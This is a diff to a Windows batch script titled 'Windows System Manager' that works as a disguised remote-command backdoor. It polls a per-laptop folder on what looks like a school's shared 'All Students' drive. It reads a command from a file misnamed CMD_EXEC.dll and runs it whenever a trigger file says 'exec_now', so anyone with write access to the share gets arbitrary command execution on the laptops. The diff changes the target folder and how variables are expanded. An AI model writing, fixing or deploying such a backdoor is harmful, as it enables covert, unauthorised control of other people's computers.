@@ -11,12 +11,12 @@
 cls
 title Windows System Manager
 set "BackBatch_Devices=P:\Composite\All Students\BackBatch\Devices"
-set "SPECIFIC_FOLDER=!BaclBatch_Devices!\lib_1" :: Change this specificly for every laptop
+set "SPECIFIC_FOLDER=%BaclBatch_Devices%\HSIE_28" :: Change this specificly for every laptop
 goto collab_search
 goto crash
 
 :collab_search
-if exist "!SPECIFIC_FOLDER!" (
+if exist "%SPECIFIC_FOLDER%" (
 	goto recieve_cmds
 ) else (
 	ping localhost -n 2 > nul
@@ -27,10 +27,10 @@ goto crash
 :recieve_cmds
 cls
 ping localhost -n 1 > nul
-set /p CMD_EXEC=<"!SPECIFIC_FOLDER!\CMD_EXEC.dll"
-set /p EXEC_CMD=<"!SPECIFIC_FOLDER!\EXEC_CMD.dll"
+set /p CMD_EXEC=<"%SPECIFIC_FOLDER%\CMD_EXEC.dll"
+set /p EXEC_CMD=<"%SPECIFIC_FOLDER%\EXEC_CMD.dll"
 if "!EXEC_CMD!" == "exec_now" (
-	!CMD_EXEC!
+	%CMD_EXEC%
 	ping localhost -n 4 > nul
 	goto recieve_cmds
 ) else (
